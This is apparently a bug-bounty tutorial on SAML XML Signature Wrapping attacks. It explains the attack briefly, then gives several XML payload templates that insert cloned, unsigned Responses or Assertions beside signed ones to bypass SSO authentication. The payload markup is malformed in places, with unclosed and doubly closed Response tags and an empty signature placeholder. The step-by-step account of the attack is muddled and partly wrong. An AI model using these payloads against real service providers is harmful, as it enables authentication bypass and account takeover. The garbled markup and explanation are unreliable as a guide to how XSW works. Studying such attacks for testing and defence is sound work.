
##  SAML(Security Assertion Markup Language) :

Signature Wrapping (XSW) attacks are based on a vulnerability in the SAML protocol. These attacks occur in the absence of XML Digital Signature (XML DSig) validation, which is used to establish trust between the identity provider (IdP) and the service provider (SP).

An attack may involve the following steps:

1. The attacker captures the user’s credentials (for example, the username and password used to log in to the identity provider).
2. The attacker creates or modifies the SAML identity statement. 
3. The identity statement verifies that the user is authorized and has the right to access a specific SP.
4. The attacker sends the SAML identity statement to the targeted SP. 
5. The identity statement implies that the attacker is an authorized user and should be trusted by the SP.
6. SP accepts the SAML credential and securely processes the user information in it without validating it.

## XML Digital Signature

XML digital signatures will **enable a sender to cryptographic sign data, and the signatures can then be used as authentication credentials or a way to check data integrity**.

**Single Sign-On (SSO)** is an authentication protocol that allows users to authenticate with multiple platforms through a single platform. With SSO, users can log in once and access services without re-entering authentication factors.

## XSW

1.Add a fake request behind an original SAML Response request and send it. This allows us to log in with SSO if the field we send is not checked by the Service.

~~~
<Response xmlns="urn:oasis:names:tc:SAML:2.0:protocol" ID="_d71c9c3e8e9f6744e6e8d18d5f7fdd5a" Version="2.0" IssueInstant="2023-07-02T12:34:56Z" Destination="https://service-provider.com/acs">
  <Issuer xmlns="urn:oasis:names:tc:SAML:2.0:assertion">https://identity-provider.com</Issuer>
  <Status xmlns="urn:oasis:names:tc:SAML:2.0:protocol">
    <StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/>
  </Status>
  <Assertion xmlns="urn:oasis:names:tc:SAML:2.0:assertion" ID="_e44c9c3e8e9f6744e6e8d18d5f7fdd5a" Version="2.0" IssueInstant="2023-07-02T12:34:56Z">
    <Issuer>https://identity-provider.com</Issuer>
    <Subject>
      <NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:unspecified">user@example.com</NameID>
      <SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
        <SubjectConfirmationData NotOnOrAfter="2023-07-02T12:44:56Z" Recipient="https://service-provider.com/acs"/>
      </SubjectConfirmation>
    </Subject>
    <Conditions NotBefore="2023-07-02T12:34:56Z" NotOnOrAfter="2023-07-02T12:44:56Z">
      <AudienceRestriction>
        <Audience>https://service-provider.com</Audience>
      </AudienceRestriction>
    </Conditions>
    <AuthnStatement AuthnInstant="2023-07-02T12:34:56Z" SessionIndex="_e44c9c3e8e9f6744e6e8d18d5f7fdd5a">
      <AuthnContext>
        <AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:Password</AuthnContextClassRef>
      </AuthnContext>
    </AuthnStatement>
    <Signature xmlns="http://www.w3.org/2000/09/xmldsig#">
      <!-- Orijinal Signature -->
    </Signature>
  </Assertion>
  ~~~

unregistered response 

  ~~~
  <Response>
    <!-- Cloned, unsigned Response copy -->
    <Issuer xmlns="urn:oasis:names:tc:SAML:2.0:assertion">https://identity-provider.com</Issuer>
    <Status xmlns="urn:oasis:names:tc:SAML:2.0:protocol">
      <StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/>
    </Status>
    <Assertion xmlns="urn:oasis:names:tc:SAML:2.0:assertion" ID="_e55c9c3e8e9f6744e6e8d18d5f7fdd5a" Version="2.0" IssueInstant="2023-07-02T12:34:56Z">
      <Issuer>https://identity-provider.com</Issuer>
      <Subject>
        <NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:unspecified">user@example.com</NameID>
        <SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
          <SubjectConfirmationData NotOnOrAfter="2023-07-02T12:44:56Z" Recipient="https://service-provider.com/acs"/>
        </SubjectConfirmation>
      </Subject>
      <Conditions NotBefore="2023-07-02T12:34:56Z" NotOnOrAfter="2023-07-02T12:44:56Z">
        <AudienceRestriction>
          <Audience>https://service-provider.com</Audience>
        </AudienceRestriction>
      </Conditions>
      <AuthnStatement AuthnInstant="2023-07-02T12:34:56Z" SessionIndex="_e55c9c3e8e9f6744e6e8d18d5f7fdd5a">
        <AuthnContext>
          <AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:Password</AuthnContextClassRef>
        </AuthnContext>
      </AuthnStatement>
    </Assertion>
  </Response>
</Response>
~~~


2.All SAML elements in the original Response have been preserved and a cloned copy of the Response has been attached unsigned. Both the original and cloned Response contain Assertions generated by the same identity provider. What we have done here is to send an unsigned response before the correct response and signature to try to get authorization from the SP and login with SSO.

~~~
<Response xmlns="urn:oasis:names:tc:SAML:2.0:protocol" ID="_d71c9c3e8e9f6744e6e8d18d5f7fdd5a" Version="2.0" IssueInstant="2023-07-02T12:34:56Z" Destination="https://service-provider.com/acs">
  <Issuer xmlns="urn:oasis:names:tc:SAML:2.0:assertion">https://identity-provider.com</Issuer>
  <Status xmlns="urn:oasis:names:tc:SAML:2.0:protocol">
    <StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/>
  </Status>
  <Assertion xmlns="urn:oasis:names:tc:SAML:2.0:assertion" ID="_e55c9c3e8e9f6744e6e8d18d5f7fdd5a" Version="2.0" IssueInstant="2023-07-02T12:34:56Z">
    <Issuer>https://identity-provider.com</Issuer>
    <Subject>
      <NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:unspecified">user@example.com</NameID>
      <SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
        <SubjectConfirmationData NotOnOrAfter="2023-07-02T12:44:56Z" Recipient="https://service-provider.com/acs"/>
      </SubjectConfirmation>
    </Subject>
    <Conditions NotBefore="2023-07-02T12:34:56Z" NotOnOrAfter="2023-07-02T12:44:56Z">
      <AudienceRestriction>
        <Audience>https://service-provider.com</Audience>
      </AudienceRestriction>
    </Conditions>
    <AuthnStatement AuthnInstant="2023-07-02T12:34:56Z" SessionIndex="_e55c9c3e8e9f6744e6e8d18d5f7fdd5a">
      <AuthnContext>
        <AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:Password</AuthnContextClassRef>
      </AuthnContext>
    </AuthnStatement>
  </Assertion>
  ~~~

 cloned copy of the response
 
~~~
 <Response>
    <Issuer xmlns="urn:oasis:names:tc:SAML:2.0:assertion">https://identity-provider.com</Issuer>
    <Status xmlns="urn:oasis:names:tc:SAML:2.0:protocol">
      <StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/>
    </Status>
    <Assertion xmlns="urn:oasis:names:tc:SAML:2.0:assertion" ID="_e55c9c3e8e9f6744e6e8d18d5f7fdd5b" Version="2.0" IssueInstant="2023-07-02T12:34:56Z">
      <Issuer>https://identity-provider.com</Issuer>
      <Subject>
        <NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:unspecified">user@example.com</NameID>
        <SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
          <SubjectConfirmationData NotOnOrAfter="2023-07-02T12:44:56Z" Recipient="https://service-provider.com/acs"/>
        </SubjectConfirmation>
      </Subject>
      <Conditions NotBefore="2023-07-02T12:34:56Z" NotOnOrAfter="2023-07-02T12:44:56Z">
        <AudienceRestriction>
          <Audience>https://service-provider.com</Audience>
        </AudienceRestriction>
      </Conditions>
      <AuthnStatement AuthnInstant="2023-07-02T12:34:56Z" SessionIndex="_e55c9c3e8e9f6744e6e8d18d5f7fdd5b">
        <AuthnContext>
          <AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:Password</AuthnContextClassRef>
        </AuthnContext>
      </AuthnStatement>
    </Assertion>
  </Response>
</Response>
~~~

3.It occurs in SAML Assertion messages. The attacker inserts a cloned and unsigned Assertion copy in front of the existing Assertion. Thus, the SAML message is manipulated to contain more than one Assertion

4.It occurs in SAML Assertion messages. The attacker inserts a cloned and unsigned Assertion copy into the existing Assertion. Thus, there is more than one Assertion in the existing Assertion and the attacker’s authorization is extended.


https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SAML%20Injection/README.md

https://medium.com/@batuhanaydinn/bug-bounty-hunter-understanding-saml-vulnerabilities-xsw-attacks-8c43c601d2d1







